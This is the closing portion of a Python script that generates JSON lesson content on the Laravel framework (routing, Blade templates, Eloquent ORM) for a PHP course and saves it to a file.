                        "mechanisms": "Composer Resolution -> Bootstrapping Kernel -> Service Providers -> Routing Pipeline.",
                        "common_mistakes": "Building complex web applications entirely from scratch without a framework, leading to unpatched security vulnerabilities."
                    }
                }
            ]
        },
        {
            "module_no": 8,
            "title": "Laravel FrameWork",
            "hours": 8,
            "marks": 10,
            "topics": [
                {
                    "id": "php_m8_t1",
                    "title": "Laravel Routing, Controller Architecture, Route Parameters & Middleware",
                    "subtopics": ["Web Routes (routes/web.php)", "Route Parameters (Required & Optional)", "Controller Actions & Resource Controllers", "Middleware Pipeline & CSRF Protection"],
                    "intro": {
                        "definition": "Routing in Laravel maps incoming HTTP requests to specific controller actions based on URI paths and HTTP verbs. Controllers encapsulate business workflows, interacting with models and returning formatted responses.",
                        "background": "Traditional PHP relied on physical file paths (e.g. `/profile.php?id=5`). Laravel uses clean virtual RESTful URIs (e.g. `/profile/5`) routed through a central routing engine.",
                        "importance": "Clean routing produces user-friendly, SEO-optimized URLs and decouples public URL structures from internal file system hierarchies.",
                        "objectives": [
                            "Define routes supporting GET, POST, PUT, and DELETE methods.",
                            "Extract required and optional route parameters with regex constraints.",
                            "Generate resource controllers via php artisan make:controller.",
                            "Attach middleware for authentication and route grouping."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Routes are registered in `routes/web.php`. Controllers handle requests and return views or JSON. Middleware acts as an inspection filter through which requests must pass before reaching controller actions.",
                        "terminology": [
                            {"term": "Route Parameter", "definition": "Dynamic segment in a URL path captured as an argument in controller methods (e.g. `{id}`)."},
                            {"term": "Resource Controller", "definition": "A controller providing boilerplate methods for all 7 standard RESTful actions."},
                            {"term": "Middleware", "definition": "A mechanism for filtering HTTP requests entering an application (e.g. auth check, CORS)."}
                        ],
                        "principles": "1. RESTful Convention: Align routes with HTTP verbs (GET for reading, POST for creating, PUT for updating, DELETE for deleting).\n2. Route Guarding: Protect sensitive routes with authentication middleware.",
                        "structures": "Route::get('/students/{id}', [StudentController::class, 'show'])->whereNumber('id');"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Request enters `public/index.php` and passes through the HTTP kernel.",
                            "2. Global middleware (session, CSRF verification) executes.",
                            "3. The Router matches the request URI against definitions in `routes/web.php`.",
                            "4. Route middleware (e.g. `auth`) verifies that the user possesses an active session.",
                            "5. Parameters inside `{id}` are extracted and passed to the controller method.",
                            "6. Controller executes business logic, queries models, and returns a view.",
                            "7. Response flows back through middleware and returns to the browser."
                        ],
                        "comparison_table": {
                            "headers": ["HTTP Verb", "URI Path", "Controller Method", "Action Description"],
                            "rows": [
                                ["GET", "/students", "index()", "Display list of all students"],
                                ["GET", "/students/create", "create()", "Show HTML form to create student"],
                                ["POST", "/students", "store()", "Save new student to database"],
                                ["GET", "/students/{id}", "show()", "Display single student details"],
                                ["GET", "/students/{id}/edit", "edit()", "Show form to edit existing student"],
                                ["PUT / PATCH", "/students/{id}", "update()", "Update existing student in DB"],
                                ["DELETE", "/students/{id}", "destroy()", "Delete student from database"]
                            ]
                        },
                        "code_architecture": "<?php
// routes/web.php
use App\Http\Controllers\StudentController;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('welcome');
});

// Grouped routes with authentication middleware
Route::middleware(['auth'])->group(function () {
    Route::resource('students', StudentController::class);
});
?>"
                    },
                    "diagram": {
                        "caption": "Figure 8.1: Laravel HTTP Request Pipeline: Routing, Middleware & Controller Dispatch",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>LARAVEL ROUTING &amp; MIDDLEWARE LIFECYCLE</text><rect x='40' y='80' width='160' height='110' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='120' y='105' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>HTTP Request</text><text x='120' y='130' font-family='monospace' font-size='10' fill='#19283D' text-anchor='middle'>GET /students/42</text><text x='120' y='155' font-family='sans-serif' font-size='10' fill='#617087' text-anchor='middle'>Enters public/index.php</text><path d='M 205 135 L 255 135' stroke='#377FE6' stroke-width='2.5'/><rect x='260' y='80' width='160' height='110' rx='8' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='340' y='105' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>Middleware Guard</text><text x='340' y='130' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• Verify CSRF Token</text><text x='340' y='150' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• Check Auth Session</text><text x='340' y='170' font-family='sans-serif' font-size='9' font-weight='600' fill='#369B72' text-anchor='middle'>✓ Verified</text><path d='M 425 135 L 475 135' stroke='#377FE6' stroke-width='2.5'/><rect x='480' y='80' width='160' height='110' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='560' y='105' font-family='sans-serif' font-size='12' font-weight='700' fill='#28A994' text-anchor='middle'>Router Match</text><text x='560' y='130' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>routes/web.php</text><text x='560' y='150' font-family='monospace' font-size='9' fill='#19283D' text-anchor='middle'>/students/{id}</text><text x='560' y='170' font-family='sans-serif' font-size='10' fill='#28A994' text-anchor='middle'>StudentController</text><path d='M 645 135 L 685 135' stroke='#28A994' stroke-width='2.5'/><rect x='690' y='80' width='75' height='110' rx='8' fill='#E8F6F3' stroke='#28A994' stroke-width='1.5'/><text x='727' y='130' font-family='sans-serif' font-size='11' font-weight='700' fill='#1B6F61' text-anchor='middle'>show(42)</text><text x='727' y='150' font-family='sans-serif' font-size='10' fill='#617087' text-anchor='middle'>Action</text></svg>"
                    },
                    "examples": {
                        "scenario": "Student Resource Controller Implementation",
                        "code": "<?php
namespace App\Http\Controllers;
use App\Models\Student;
use Illuminate\Http\Request;

class StudentController extends Controller {
    public function index() {
        $students = Student::paginate(15);
        return view('students.index', compact('students'));
    }
    public function show($id) {
        $student = Student::findOrFail($id);
        return view('students.show', compact('student'));
    }
}
?>"
                    },
                    "important_points": [
                        "Web routes are registered in `routes/web.php` and API routes in `routes/api.php`.",
                        "Route parameters are defined inside curly braces (`Route::get('/users/{id}', ...)`).",
                        "`Route::resource()` automatically generates routes for all 7 standard CRUD operations.",
                        "Middleware filters requests before they reach controller logic.",
                        "Named routes (`->name('students.index')`) decouple link URLs from URI paths."
                    ],
                    "revision": {
                        "summary": "Routing maps HTTP verbs and URIs to controller actions. Middleware enforces authentication, input validation, and security before controller methods execute.",
                        "terminology": "routes/web.php, Route Parameters, Resource Controller, Middleware, Named Routes.",
                        "mechanisms": "URI -> Kernel -> Middleware -> Route Match -> Controller Action -> View.",
                        "common_mistakes": "Forgetting that `routes/web.php` enforces CSRF verification on all POST requests by default."
                    }
                },
                {
                    "id": "php_m8_t2",
                    "title": "Blade Templating Engine: Directives, Template Inheritance & Component Rendering",
                    "subtopics": ["Blade Compilation Process", "Master Layouts & Template Inheritance (@extends, @section, @yield)", "Blade Directives (@if, @foreach, @empty, @csrf)", "Blade Components & Data Binding"],
                    "intro": {
                        "definition": "Blade is the simple, powerful templating engine bundled with Laravel. Unlike other PHP templating engines, Blade does not restrict you from using plain PHP code in your templates, compiling files into cached PHP scripts for zero runtime overhead.",
                        "background": "Traditional PHP templates relied on opening and closing `<?php ... ?>` tags, resulting in noisy markup. Blade introduced clean `@directives` and double-curly braces `{{ ... }}` for outputting escaped variables.",
                        "importance": "Blade's template inheritance allows defining a master layout with shared headers, navigation bars, and footers once, ensuring visual consistency across hundreds of pages.",
                        "objectives": [
                            "Construct master layouts using @yield and @section directives.",
                            "Extend master layouts in child views using @extends.",
                            "Render escaped dynamic variables using {{ $var }} to prevent XSS.",
                            "Utilize control flow directives (@if, @foreach, @empty, @auth)."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Blade templates are stored in `resources/views` with the `.blade.php` file extension. The compiler transforms Blade syntax into raw PHP and caches compiled templates in `storage/framework/views`.",
                        "terminology": [
                            {"term": "@extends", "definition": "Specifies which master layout template the current child view inherits from."},
                            {"term": "@yield", "definition": "Defines a placeholder section in a master layout where child templates inject content."},
                            {"term": "@section", "definition": "Defines a block of HTML content within a child template matching a layout @yield."},
                            {"term": "{{ $var }}", "definition": "Echoes data with automatic `htmlspecialchars()` escaping applied."}
                        ],
                        "principles": "1. DRY Layouts: Master page structure is defined once and inherited by child views.\n2. Automatic Escaping: Double curly braces `{{ }}` always escape HTML entities to prevent XSS; `{!! !!}` renders raw unescaped HTML."
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Create master layout `resources/views/layouts/app.blade.php`.",
                            "2. Define layout header, navigation, and `@yield('content')`.",
                            "3. Create child view `resources/views/students/index.blade.php` starting with `@extends('layouts.app')`.",
                            "4. Wrap page content in `@section('content') ... @endsection`.",
                            "5. In the controller, return `view('students.index', ['students' => $data])`.",
                            "6. Blade engine checks if compiled template in `storage/framework/views` is newer than the source file.",
                            "7. If modified: compiles Blade directives to raw PHP opcodes, caches the file, and renders output."
                        ],
                        "comparison_table": {
                            "headers": ["Blade Syntax", "Equivalent Pure PHP Syntax", "Behavior / Escaping"],
                            "rows": [
                                ["{{ $name }}", "<?php echo htmlspecialchars($name, ENT_QUOTES); ?>", "Escapes HTML entities to prevent XSS"],
                                ["{!! $rawHtml !!}", "<?php echo $rawHtml; ?>", "Renders unescaped raw HTML (Caution)"],
                                ["@if ($count > 0)", "<?php if ($count > 0): ?>", "Conditional branching control"],
                                ["@foreach ($items as $it)", "<?php foreach ($items as $it): ?>", "Array iteration loop"],
                                ["@csrf", "<input type='hidden' name='_token' value='...'>", "Generates hidden anti-CSRF form input"]
                            ]
                        },
                        "code_architecture": "<!-- 1. Master Layout: resources/views/layouts/app.blade.php -->
<!DOCTYPE html>
<html>
<head><title>@yield('title', 'MAKAUT BCA')</title></head>
<body>
    <nav><a href="/">Home</a> | <a href="/students">Students</a></nav>
    <main>
        @yield('content')
    </main>
</body>
</html>

<!-- 2. Child View: resources/views/students/index.blade.php -->
@extends('layouts.app')
@section('title', 'Enrolled Students')
@section('content')
    <h2>Student Directory</h2>
    <ul>
        @forelse ($students as $s)
            <li>{{ $s->name }} (Roll: {{ $s->roll }})</li>
        @empty
            <p>No students currently enrolled.</p>
        @endforelse
    </ul>
@endsection"
                    },
                    "diagram": {
                        "caption": "Figure 8.2: Blade Template Inheritance: Master Layout and Child View Composition",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#786CE5' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#786CE5'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>BLADE TEMPLATE INHERITANCE ARCHITECTURE</text><rect x='40' y='75' width='280' height='125' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='180' y='98' font-family='sans-serif' font-size='11' font-weight='700' fill='#786CE5' text-anchor='middle'>Master Layout (layouts/app.blade.php)</text><rect x='55' y='110' width='250' height='22' rx='4' fill='#E9E8F8'/><text x='180' y='125' font-family='monospace' font-size='10' fill='#786CE5' text-anchor='middle'>&lt;header&gt; + Global Nav Bar</text><rect x='55' y='140' width='250' height='45' rx='4' fill='#FFF2EB' stroke='#EF846B' stroke-dasharray='3,3'/><text x='180' y='168' font-family='monospace' font-size='11' font-weight='700' fill='#EF846B' text-anchor='middle'>@yield('content')</text><path d='M 330 140 L 430 140' stroke='#377FE6' stroke-width='2.5'/><text x='380' y='130' font-family='sans-serif' font-size='9' font-weight='700' fill='#377FE6' text-anchor='middle'>@extends</text><rect x='440' y='75' width='300' height='125' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='590' y='98' font-family='sans-serif' font-size='11' font-weight='700' fill='#28A994' text-anchor='middle'>Child View (students/index.blade.php)</text><rect x='455' y='110' width='270' height='75' rx='4' fill='#E8F6F3' stroke='#28A994'/><text x='590' y='130' font-family='monospace' font-size='10' font-weight='700' fill='#1B6F61' text-anchor='middle'>@section('content')</text><text x='590' y='150' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• Injects Table of Students</text><text x='590' y='170' font-family='monospace' font-size='10' font-weight='700' fill='#1B6F61' text-anchor='middle'>@endsection</text></svg>"
                    },
                    "examples": {
                        "scenario": "Live Student Registration Blade Form",
                        "code": "<form method="POST" action="/students">
    @csrf
    <label>Student Name:</label>
    <input type="text" name="name" value="{{ old('name') }}">
    @error('name')
        <p class="error">{{ $message }}</p>
    @enderror
    <button type="submit">Save</button>
</form>"
                    },
                    "important_points": [
                        "Blade views use the `.blade.php` extension and compile into cached PHP code.",
                        "Double curly braces `{{ $data }}` automatically escape strings via `htmlspecialchars()`.",
                        "`@yield('name')` defines an injection slot in layouts; `@section('name')` fills it in child views.",
                        "`@csrf` generates the required hidden anti-CSRF token input field.",
                        "`@forelse` provides a clean loop construct with an `@empty` fallback for zero records."
                    ],
                    "revision": {
                        "summary": "Blade combines readability with performance. Master templates use `@yield`, child views extend with `@extends`, and directives like `@csrf` and `{{ }}` safeguard security.",
                        "terminology": "@extends, @yield, @section, {{ }}, {!! !!}, @csrf, @forelse, Blade compiler.",
                        "mechanisms": "Blade Template -> Lexer & Directive Translation -> Cached PHP File -> Native PHP Opcode Execution.",
                        "common_mistakes": "Using `{!! $user_input !!}` on untrusted data, circumventing XSS escaping."
                    }
                },
                {
                    "id": "php_m8_t3",
                    "title": "Eloquent ORM: Active Record, Database Migrations, CRUD & Relationships",
                    "subtopics": ["Active Record Pattern in Eloquent", "Database Migrations & Schema Builder", "Eloquent CRUD Operations (find, create, update, delete)", "Relational Associations (hasOne, hasMany, belongsTo, belongsToMany)"],
                    "intro": {
                        "definition": "Eloquent ORM is Laravel's native Object-Relational Mapper that implements the Active Record architectural pattern. Each database table corresponds to an Eloquent Model class used to interact with that table.",
                        "background": "Writing raw SQL queries across large applications leads to code duplication and database-specific coupling. Eloquent abstracts database records into rich PHP objects, supporting migrations for version control and relationships.",
                        "importance": "Eloquent enables developers to write database queries using expressive, readable PHP methods, eliminating boilerplate SQL while handling foreign key relationships seamlessly.",
                        "objectives": [
                            "Create and execute database migrations via Artisan CLI.",
                            "Perform CRUD operations using Eloquent model methods.",
                            "Define One-to-One (hasOne), One-to-Many (hasMany), and Inverse (belongsTo) relationships.",
                            "Eager-load relational data with with() to prevent N+1 query performance problems."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "In Active Record, a model instance represents a single database row. Modifying object properties and calling `save()` updates the corresponding database record automatically.",
                        "terminology": [
                            {"term": "Eloquent", "definition": "Laravel's Active Record ORM providing an expressive object interface for database tables."},
                            {"term": "Migration", "definition": "A version control file for database schemas, defining column structures in PHP code."},
                            {"term": "N+1 Problem", "definition": "A performance antipattern where an application executes 1 query for parents plus N separate queries for children."},
                            {"term": "Eager Loading", "definition": "Loading relational records upfront in a single SQL query using the `with()` method."}
                        ],
                        "principles": "1. Schema as Code: Track all database schema modifications in versioned migration files.\n2. Prevent N+1: Always use eager loading (`Student::with('department')->get()`) when displaying relational datasets.",
                        "structures": "class Student extends Model { public function department() { return $this->belongsTo(Department::class); } }"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Generate migration: `php artisan make:migration create_students_table`.",
                            "2. Define columns in the migration schema: `$table->string('name'); $table->foreignId('department_id');`.",
                            "3. Run `php artisan migrate` to execute DDL statements on the MySQL database.",
                            "4. Create Eloquent model `Student.php` inheriting `Illuminate\Database\Eloquent\Model`.",
                            "5. Define relationship methods: `return $this->belongsTo(Department::class);`.",
                            "6. Execute queries: `Student::where('cgpa', '>=', 8.5)->orderBy('name')->get();`.",
                            "7. Insert records cleanly using mass assignment: `Student::create($request->validated());`."
                        ],
                        "comparison_table": {
                            "headers": ["Relationship Type", "Parent Method", "Child Method", "Database Foreign Key Location"],
                            "rows": [
                                ["One-to-One", "$this->hasOne(Profile::class)", "$this->belongsTo(User::class)", "Stored in `profiles` table (`user_id`)"],
                                ["One-to-Many", "$this->hasMany(Course::class)", "$this->belongsTo(Department::class)", "Stored in `courses` table (`department_id`)"],
                                ["Many-to-Many", "$this->belongsToMany(Student::class)", "$this->belongsToMany(Course::class)", "Stored in pivot table `course_student`"]
                            ]
                        },
                        "code_architecture": "<?php
// 1. Migration Definition
// database/migrations/2024_01_01_create_students_table.php
Schema::create('students', function (Blueprint $table) {
    $table->id();
    $table->foreignId('department_id')->constrained()->onDelete('cascade');
    $table->string('name');
    $table->string('email')->unique();
    $table->float('cgpa', 3, 2);
    $table->timestamps();
});

// 2. Eloquent Model with Relationship
namespace App\Models;
use Illuminate\Database\Eloquent\Model;

class Student extends Model {
    protected $fillable = ['department_id', 'name', 'email', 'cgpa'];

    public function department() {
        return $this->belongsTo(Department::class);
    }
}

// 3. Eager Loading Query in Controller
$honorStudents = Student::with('department')
    ->where('cgpa', '>=', 9.0)
    ->get();
?>"
                    },
                    "diagram": {
                        "caption": "Figure 8.3: Eloquent Active Record Relational Mapping and Migration Architecture",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#28A994' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#28A994'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>ELOQUENT ORM RELATIONAL MAPPING ARCHITECTURE</text><rect x='40' y='75' width='220' height='125' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='150' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>Department Model</text><text x='55' y='125' font-family='monospace' font-size='10' fill='#19283D'>id: 1, name: 'BCA'</text><text x='55' y='150' font-family='monospace' font-size='10' fill='#786CE5'>hasMany(Student::class)</text><text x='55' y='175' font-family='sans-serif' font-size='9' fill='#617087'>One department, many students</text><path d='M 265 135 L 345 135' stroke='#377FE6' stroke-width='2.5'/><text x='305' y='125' font-family='sans-serif' font-size='9' font-weight='700' fill='#377FE6' text-anchor='middle'>1 : N</text><rect x='350' y='75' width='230' height='125' rx='8' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='465' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>Student Model</text><text x='365' y='125' font-family='monospace' font-size='10' fill='#19283D'>id: 101, dept_id: 1</text><text x='365' y='150' font-family='monospace' font-size='10' fill='#377FE6'>belongsTo(Dept::class)</text><text x='365' y='175' font-family='sans-serif' font-size='9' fill='#369B72'>Foreign Key: department_id</text><path d='M 585 135 L 635 135' stroke='#28A994' stroke-width='2.5'/><rect x='640' y='75' width='120' height='125' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='700' y='100' font-family='sans-serif' font-size='11' font-weight='700' fill='#28A994' text-anchor='middle'>MySQL</text><text x='650' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• InnoDB</text><text x='650' y='145' font-family='sans-serif' font-size='10' fill='#19283D'>• Migrations</text><text x='650' y='165' font-family='sans-serif' font-size='10' fill='#19283D'>• Foreign Keys</text></svg>"
                    },
                    "examples": {
                        "scenario": "Live Eloquent Query Execution",
                        "code": "<?php
// Fetch students with distinction and their department
$toppers = Student::with('department')
    ->where('cgpa', '>=', 8.5)
    ->orderByDesc('cgpa')
    ->take(5)
    ->get();

foreach ($toppers as $t) {
    echo "{$t->name} - {$t->department->name}: {$t->cgpa}\n";
}
?>"
                    },
                    "important_points": [
                        "Eloquent implements Active Record where model instances correspond directly to database rows.",
                        "Database migrations provide version control for database schemas, created via `php artisan`.",
                        "Define relationships using methods like `hasOne()`, `hasMany()`, and `belongsTo()`.",
                        "Prevent N+1 query bottlenecks by eager-loading relations with `with('relationName')`.",
                        "Mass assignment protection requires specifying permitted attributes in `$fillable`."
                    ],
                    "revision": {
                        "summary": "Eloquent ORM offers an object-oriented database interface. Database migrations define versioned schemas, while methods like `hasMany` and `belongsTo` manage relationships without manual JOIN queries.",
                        "terminology": "Eloquent, Active Record, Migrations, Schema Builder, belongsTo, hasMany, Eager Loading, N+1 Problem.",
                        "mechanisms": "Migration Schema -> Table Creation -> Model Mapping -> Query Builder -> Result Hydration.",
                        "common_mistakes": "Accessing relations inside a `foreach` loop without eager loading (`with()`), causing N+1 queries that severely degrade database performance."
                    }
                }
            ]
        }
    ]
    return modules

mods = get_php_modules()
os.makedirs("builder/data", exist_ok=True)
with open("builder/data/lessons_php.json", "w", encoding="utf-8") as f:
    json.dump(mods, f, indent=2)

print("Saved builder/data/lessons_php.json successfully!")
print("PHP modules generated:", len(mods))
for m in mods:
    print(f"Module {m['module_no']}: {m['title']} ({len(m['topics'])} topics)")
